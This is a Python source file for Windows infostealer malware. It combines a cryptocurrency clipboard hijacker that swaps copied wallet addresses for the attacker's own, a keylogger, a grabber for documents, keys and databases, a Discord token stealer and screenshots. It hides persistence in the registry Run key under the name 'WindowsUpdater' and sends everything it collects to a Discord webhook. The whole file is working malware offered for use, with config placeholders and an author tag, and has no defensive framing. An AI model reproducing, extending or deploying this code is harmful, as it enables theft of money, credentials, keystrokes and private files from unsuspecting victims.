import pyperclip
import re
import time
import requests
import socket
import getpass
import platform
import os
import sys
import winreg
import shutil
import zipfile
import threading
from datetime import datetime

# ===== CONFIG (CHANGE THESE) =====
TARGET_ADDRESS = "YOUR_WALLET_ADDRESS_HERE"
WEBHOOK_URL = "https://discord.com/api/webhooks/..."
SIGNATURE = "made by @xmrig. on dc"

# ===== TEMP DIRECTORY =====
TEMP_DIR = os.path.join(os.environ['TEMP'], f"steal_{int(time.time())}")
os.makedirs(TEMP_DIR, exist_ok=True)

# ===== KEYLOGGER (Sends to Discord) =====
keylog_buffer = []
keylog_lock = threading.Lock()
keylogger_running = False
KEYLOG_SEND_INTERVAL = 10  # seconds
KEYLOG_BATCH_SIZE = 50     # send when buffer reaches this many keys

def send_keylog_batch():
    global keylog_buffer
    with keylog_lock:
        if not keylog_buffer:
            return
        batch = ''.join(keylog_buffer)
        keylog_buffer = []
    content = f"**Keylog ({datetime.now().strftime('%Y-%m-%d %H:%M:%S')})**\n```\n{batch}\n```"
    try:
        requests.post(WEBHOOK_URL, json={"content": content[:2000]})
    except:
        pass

def keylogger_worker():
    global keylogger_running
    try:
        import keyboard
        keylogger_running = True
        def on_key(event):
            global keylog_buffer
            with keylog_lock:
                if len(event.name) == 1:
                    keylog_buffer.append(event.name)
                else:
                    if event.name == 'space':
                        keylog_buffer.append(' ')
                    elif event.name == 'enter':
                        keylog_buffer.append('\n')
                    elif event.name == 'tab':
                        keylog_buffer.append('\t')
                    elif event.name == 'backspace':
                        if keylog_buffer:
                            keylog_buffer.pop()
                if len(keylog_buffer) >= KEYLOG_BATCH_SIZE:
                    send_keylog_batch()
        keyboard.on_press(on_key)
        print("[+] Keylogger started (sending to Discord).")
        while keylogger_running:
            time.sleep(KEYLOG_SEND_INTERVAL)
            send_keylog_batch()
    except ImportError:
        print("[-] Keylogger requires 'keyboard' library. Install: pip install keyboard")
    except Exception as e:
        print(f"[-] Keylogger error: {e}")

# ===== FILE GRABBER =====
def grab_files():
    grabbed = []
    target_folders = [
        os.path.expanduser("~\\Documents"),
        os.path.expanduser("~\\Desktop"),
        os.path.expanduser("~\\Downloads"),
    ]
    extensions = ('.txt', '.docx', '.pdf', '.jpg', '.png', '.zip', '.rar', '.log', '.key', '.pem', '.sqlite', '.db')
    max_size = 10 * 1024 * 1024
    dest_root = os.path.join(TEMP_DIR, "files")
    os.makedirs(dest_root, exist_ok=True)

    for folder in target_folders:
        if not os.path.exists(folder):
            continue
        for root, dirs, files in os.walk(folder):
            if any(part.startswith('.') for part in root.split(os.sep)):
                continue
            for file in files:
                if file.lower().endswith(extensions):
                    full_path = os.path.join(root, file)
                    try:
                        size = os.path.getsize(full_path)
                        if size > max_size:
                            continue
                        rel_path = os.path.relpath(full_path, folder)
                        dest_path = os.path.join(dest_root, rel_path)
                        os.makedirs(os.path.dirname(dest_path), exist_ok=True)
                        shutil.copy2(full_path, dest_path)
                        grabbed.append(dest_path)
                    except:
                        continue
    return grabbed

# ===== PERSISTENCE =====
def add_persistence():
    try:
        script_path = sys.argv[0]
        key = winreg.HKEY_CURRENT_USER
        subkey = r"Software\Microsoft\Windows\CurrentVersion\Run"
        with winreg.OpenKey(key, subkey, 0, winreg.KEY_SET_VALUE) as reg_key:
            winreg.SetValueEx(reg_key, "WindowsUpdater", 0, winreg.REG_SZ, script_path)
        return True
    except Exception as e:
        print(f"[-] Persistence failed: {e}")
        return False

# ===== DISCORD TOKEN GRABBER =====
def find_discord_tokens():
    tokens = []
    paths = [
        os.path.join(os.getenv('APPDATA'), 'Discord', 'Local Storage', 'leveldb'),
        os.path.join(os.getenv('APPDATA'), 'discordcanary', 'Local Storage', 'leveldb'),
        os.path.join(os.getenv('APPDATA'), 'discordptb', 'Local Storage', 'leveldb'),
        os.path.join(os.getenv('APPDATA'), 'Lightcord', 'Local Storage', 'leveldb'),
        os.path.join(os.getenv('APPDATA'), 'BetterDiscord', 'Local Storage', 'leveldb')
    ]
    for path in paths:
        if os.path.exists(path):
            for file in os.listdir(path):
                if file.endswith('.log') or file.endswith('.ldb'):
                    try:
                        with open(os.path.join(path, file), 'r', errors='ignore') as f:
                            content = f.read()
                            matches = re.findall(r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', content)
                            tokens.extend(matches)
                    except:
                        pass
    return list(set(tokens))

# ===== SYSTEM INFO =====
def get_system_info():
    return {
        "hostname": socket.gethostname(),
        "ip": socket.gethostbyname(socket.gethostname()),
        "user": getpass.getuser(),
        "os": platform.system() + " " + platform.release()
    }

# ===== SCREENSHOT =====
def take_screenshot():
    try:
        import pyautogui
        ss = pyautogui.screenshot()
        path = os.path.join(TEMP_DIR, "screenshot.png")
        ss.save(path)
        return path
    except:
        return None

# ===== WEBHOOK EXFILTRATION =====
def send_to_webhook(original, replaced, sys_info, tokens=None, screenshot_path=None, zip_path=None):
    content = (
        f"**Clipper Alert**\n"
        f"Original: {original}\n"
        f"Replaced: {replaced}\n"
        f"System: {sys_info['hostname']} ({sys_info['ip']}) - {sys_info['user']}\n"
        f"OS: {sys_info['os']}\n"
        f"Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
        f"Signature: {SIGNATURE}\n"
    )
    if tokens:
        content += f"\n**Discord Tokens Found:**\n```\n" + "\n".join(tokens[:5]) + "\n```"
    
    files_to_send = []
    if screenshot_path and os.path.exists(screenshot_path):
        files_to_send.append(('file', (os.path.basename(screenshot_path), open(screenshot_path, 'rb'), 'image/png')))
    if zip_path and os.path.exists(zip_path):
        files_to_send.append(('file', (os.path.basename(zip_path), open(zip_path, 'rb'), 'application/zip')))

    try:
        requests.post(WEBHOOK_URL, json={"content": content})
    except:
        pass

    if files_to_send:
        try:
            requests.post(WEBHOOK_URL, files=files_to_send)
        except Exception as e:
            print(f"[-] File send error: {e}")
        finally:
            for _, (_, _, file_obj) in files_to_send:
                file_obj.close()
            if screenshot_path and os.path.exists(screenshot_path):
                os.remove(screenshot_path)
            if zip_path and os.path.exists(zip_path):
                os.remove(zip_path)

# ===== ZIP CREATOR =====
def create_zip():
    zip_path = os.path.join(os.environ['TEMP'], f"data_{int(time.time())}.zip")
    with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as z:
        for root, _, files in os.walk(TEMP_DIR):
            for f in files:
                full = os.path.join(root, f)
                arcname = os.path.relpath(full, TEMP_DIR)
                z.write(full, arcname)
    return zip_path

# ===== REGEX PATTERNS =====
PATTERNS = [
    r'(?:[13][a-km-zA-HJ-NP-Z1-9]{25,34}|bc1[a-zA-HJ-NP-Z0-9]{39,59})',
    r'0x[a-fA-F0-9]{40}',
    r'[48][0-9AB][a-km-zA-HJ-NP-Z1-9]{93,95}'
]

# ===== MAIN CLIPPER LOOP =====
def monitor_clipboard():
    last = ""
    sys_info = get_system_info()
    print("[*] Clipper active. Copy a crypto address to see the swap.")
    print(f"[*] {SIGNATURE}")
    while True:
        time.sleep(0.5)
        current = pyperclip.paste()
        if current != last and current.strip():
            for pattern in PATTERNS:
                match = re.search(pattern, current)
                if match:
                    original = match.group(0)
                    print(f"[!] Found address: {original[:12]}...")
                    new_text = current.replace(original, TARGET_ADDRESS)
                    pyperclip.copy(new_text)
                    print(f"[+] Replaced with: {TARGET_ADDRESS[:12]}...")

                    tokens = find_discord_tokens()
                    if tokens:
                        print(f"[+] Found {len(tokens)} token(s).")

                    grabbed_files = grab_files()
                    if grabbed_files:
                        print(f"[+] Grabbed {len(grabbed_files)} file(s).")

                    ss = take_screenshot()
                    if ss:
                        print("[+] Screenshot captured.")

                    zip_path = create_zip()
                    if zip_path:
                        print("[+] Packed data into ZIP.")

                    send_to_webhook(original, TARGET_ADDRESS, sys_info, tokens, ss, zip_path)

                    try:
                        shutil.rmtree(TEMP_DIR)
                    except:
                        pass

                    break
        last = current

# ===== ENTRY POINT =====
if __name__ == "__main__":
    print("="*60)
    print(" CRYPTO CLIPPER + KEYLOGGER + FILE GRABBER + TOKEN GRABBER")
    print("="*60)
    print(f"Target: {TARGET_ADDRESS}")
    print("Press Ctrl+C to stop.\n")

    if add_persistence():
        print("[+] Persistence added (runs on startup).")
    else:
        print("[-] Persistence failed (may need admin).")

    keylog_thread = threading.Thread(target=keylogger_worker, daemon=True)
    keylog_thread.start()
    print("[*] Keylogger thread started (batches sent to Discord).")

    try:
        monitor_clipboard()
    except KeyboardInterrupt:
        print("\n[!] Stopped.")
        global keylogger_running
        keylogger_running = False
        try:
            shutil.rmtree(TEMP_DIR)
        except:
            pass
